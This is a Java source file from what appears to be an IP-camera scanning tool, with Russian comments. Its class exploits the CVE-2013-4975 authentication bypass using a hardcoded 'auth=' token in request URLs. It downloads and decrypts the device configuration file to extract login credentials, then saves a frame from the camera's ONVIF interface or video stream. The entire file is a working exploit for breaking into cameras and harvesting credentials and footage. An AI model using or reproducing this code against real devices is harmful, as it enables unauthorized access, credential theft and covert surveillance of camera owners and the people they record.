package scanner.runner.unlock.cve;

import lombok.extern.slf4j.Slf4j;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.Preferences;
import scanner.screen.StreamScreenSaver;
import scanner.http.HttpClient;
import scanner.screen.OnvifScreenSaver;
import scanner.runner.Target;
import scanner.runner.unlock.Credentials;

import java.io.IOException;
import java.util.Objects;

import static scanner.Preferences.ALLOW_FRAME_SAVING;
import static scanner.runner.unlock.UnlockType.*;

/**
 * Класс проверки объекта на уязвимость CVE-2013-4975.
 *
 * @author inkarnadin
 * on 08-01-2023
 */
@Slf4j
public class CVEScanner {

    private static final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";
    private static final String CONFIG_FILE = "http://%s/System/configurationFile?auth=YWRtaW46MTIzNDU=";

    /**
     * Метод проверки на уязвимость.
     * <p/>Входной адрес проверяется на уязвимость CVE-2013-4975 с помощью специально сконфигурированного
     * http-запроса. В случае успеха происходит получения конфигурационного файла устройства с последующим разбором и
     * получением учетных данных.
     * <p/>В случае успеха происходит попытка сохранить изображение с устройства на физический носитель - для данного вида
     * разблокировки доступа доступны два способа - непосредственно через поток данных либо через протокол ONVIF.
     * <p/>
     *
     * @param ip целевой адрес
     * @return результат разбора в виде заполненного целевого объекта
     */
    public Target scanning(String ip) {
        log.debug("[{}] checking CVE", ip);
        Credentials credentials = Credentials.empty();
        try (Response response = HttpClient.doGet(String.format(CVE_2013_4975, ip))) {
            ResponseBody responseBody = response.body();
            if (Objects.nonNull(responseBody)) {
                String body = responseBody.string();
                if (body.contains("firmwareVersion")) {
                    try (Response configFile = HttpClient.doGet(String.format(CONFIG_FILE, ip))) {
                        ResponseBody configFileBody = configFile.body();
                        credentials = (Objects.nonNull(configFileBody))
                                ? ConfigurationDecrypt.decrypt(configFileBody.byteStream())
                                : Credentials.empty();
                    }
                }
            }
        } catch (IOException iox) {
            log.debug("[{}] error during CVE checking: {}", ip, iox.getMessage());
        }

        if (credentials.isPresent()) {
            String creds = credentials.get();
            if (Preferences.check(ALLOW_FRAME_SAVING)) {
                boolean isSuccess = OnvifScreenSaver.save(ip);
                if (!isSuccess) {
                    StreamScreenSaver.save(creds, ip);
                }
            }
        }

        return Target.builder()
                .host(ip)
                .path("11")
                .credentials(credentials)
                .isFreeStream(false)
                .unlockType(CVE)
                .build();
    }

}